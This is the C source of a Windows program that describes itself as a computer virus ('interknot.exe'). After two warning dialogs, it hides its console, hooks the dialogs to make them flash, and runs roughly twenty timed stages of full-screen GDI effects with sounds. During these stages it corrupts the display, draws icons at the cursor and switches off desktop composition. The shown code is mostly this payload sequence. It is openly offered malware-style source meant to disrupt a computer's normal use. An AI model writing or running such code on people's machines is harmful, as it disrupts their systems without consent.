#pragma warning(disable:4244)
#pragma warning(disable:4552)
#pragma warning(disable:4554)
#pragma warning(disable:4129)
#pragma warning(disable:4305)
#pragma warning(disable:4309)
#pragma warning(disable:4715)

#include"def.h"
#include"sound.h"
#include"glitch.h"
#include"payload.h"
#include"resource.h"

void clean(){
	for(int i=0;i<80;i++){
		InvalidateRect(0,0,0);
	}
}
HRESULT DwmEnableComposition(UINT uCompositionAction){
	typedef HRESULT(WINAPI *_dwmEnableComposition)(UINT uCompositionAction);
	HMODULE hm=LoadLibrary(_T("dwmapi.dll"));
	if(hm==NULL) return -1;
	_dwmEnableComposition dwmfunc=(_dwmEnableComposition)GetProcAddress(hm,"DwmEnableComposition");
	return dwmfunc(uCompositionAction);
}

VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	InvalidateRect(0, 0, 0);
	for (;;) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		Sleep(100);
	}
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		Sleep(100);
//		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI DrawIcons(LPVOID unused)
{
	POINT cursor;HWND hwnd = GetDesktopWindow();HDC hdc = GetWindowDC(hwnd);
	while (1) {
		GetCursorPos(&cursor);
		DrawIcon(hdc, cursor.x, cursor.y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1)));
		Sleep(10);
	}
}

void RunPayload(){
	HANDLE msg=CreateThread(NULL,0,msgbox,NULL,0,NULL);
	HANDLE icondraw = CreateThread(NULL, 0, DrawIcons, NULL, 0, NULL);
//	DwmEnableComposition(0);
	Sleep(1000);

	sound1();
	HANDLE sh1=CreateThread(NULL,0,GDIShader1,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh1,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound2();
	HANDLE sh2=CreateThread(NULL,0,GDIShader2,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh2,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound3();
	HANDLE sh3=CreateThread(NULL,0,GDIShader3,NULL,0,NULL);
	HANDLE aball=CreateThread(NULL,0,Payload1a_AmazingBall,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh3,0);
	TerminateThread(aball,0);
	clean();
	Sleep(100);

	sound4();
	HANDLE sh4=CreateThread(NULL,0,GDIShader4,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh4,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound5();
	aball = CreateThread(NULL, 0, Payload1a_AmazingBall, NULL, 0, NULL);
	HANDLE sh5=CreateThread(NULL,0,GDIShader5,NULL,0,NULL);
	HANDLE ntrain=CreateThread(NULL,0,Payload2a_Train,NULL,0,NULL);
	Sleep(30000);
	TerminateThread(sh5,0);
	TerminateThread(ntrain,0);
	InvalidateRect(0,0,0);
	Sleep(100);

	sound6();
	HANDLE sh6 = CreateThread(NULL, 0, GDIShader6, NULL, 0, NULL);
	HANDLE roundrect = CreateThread(NULL, 0, Payload3a_RoundRects, NULL, 0, NULL);
	HANDLE hell = CreateThread(NULL, 0, Payload3b_Hell, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh6, 0);
	TerminateThread(roundrect, 0);
	TerminateThread(hell, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	DwmEnableComposition(0);
	sound7();
	HANDLE sh7 = CreateThread(NULL, 0, GDIShader7, NULL, 0, NULL);
	HANDLE sine = CreateThread(NULL, 0, Payload4a_Waves, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh7, 0);
	TerminateThread(sine,0);
	DwmEnableComposition(1);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound8();
	HANDLE pat1 = CreateThread(NULL, 0, Payload5a_Pat1, NULL, 0, NULL);
	HANDLE melt1 = CreateThread(NULL, 0, Payload5b_Melt1, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(pat1, 0);
	TerminateThread(melt1, 0);
	clean();
	Sleep(100);

	sound9();
	HANDLE sh8a = CreateThread(NULL, 0, GDIShader8a, NULL, 0, NULL);
	HANDLE sh8b = CreateThread(NULL, 0, GDIShader8b, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh8a, 0);
	TerminateThread(sh8b, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound10();
	HANDLE sh9 = CreateThread(NULL, 0, GDIShader9, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh9, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound11();
	HANDLE sh10 = CreateThread(NULL, 0, GDIShader10, NULL, 0, NULL);
	HANDLE textout = CreateThread(NULL, 0, Payload6_Textout, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh10, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound12();
	HANDLE spirtal = CreateThread(NULL, 0, Payload7a_Spiral, NULL, 0, NULL);
	HANDLE cube3d = CreateThread(NULL, 0, Payload7b_3DCube, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(spirtal, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound13();
	HANDLE sh11a = CreateThread(NULL, 0, GDIShader11a, NULL, 0, NULL);
	HANDLE sh11b = CreateThread(NULL, 0, GDIShader11b, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh11a, 0);
	TerminateThread(sh11b, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound14();
	HANDLE sh12a = CreateThread(NULL, 0, GDIShader12a, NULL, 0, NULL);
	HANDLE sh12b = CreateThread(NULL, 0, GDIShader12b, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh12a, 0);
	TerminateThread(sh12b, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound15();
	HANDLE sh13 = CreateThread(NULL, 0, GDIShader13, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh13, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound16();
	HANDLE sh14a = CreateThread(NULL, 0, GDIShader14a, NULL, 0, NULL);
	HANDLE sh14b = CreateThread(NULL, 0, GDIShader14b, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh14a, 0);
	TerminateThread(sh14b, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound17();
	HANDLE sh15 = CreateThread(NULL, 0, GDIShader15, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh15, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound18();
	HANDLE sh16 = CreateThread(NULL, 0, GDIShader16, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh16, 0);
	TerminateThread(aball, 0);
	TerminateThread(cube3d, 0);
	TerminateThread(textout, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound19();
	HANDLE sh17 = CreateThread(NULL, 0, GDIShader17, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh17, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound20();
	HANDLE cube4d = CreateThread(NULL, 0, Payload8a_Cube4D, NULL, 0, NULL);
	HANDLE textout2 = CreateThread(NULL, 0, Payload8b_TextOut2, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(cube4d, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);
}
int main(){
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	if(MessageBoxW(NULL,L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\n\nPlease don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the 'Yes' button to continue.", L"interknot.exe -- WARNING", MB_YESNO|MB_ICONWARNING|MB_DEFBUTTON2)==IDYES){
		HHOOK hMsgHook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"This is the last warning!!!\n\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"interknot.exe -- WARNING", MB_YESNO|MB_ICONWARNING|MB_DEFBUTTON2|MB_RTLREADING) == IDYES){
			UnhookWindowsHookEx(hMsgHook);
			RunPayload();
		}
	}
	return 0;
}
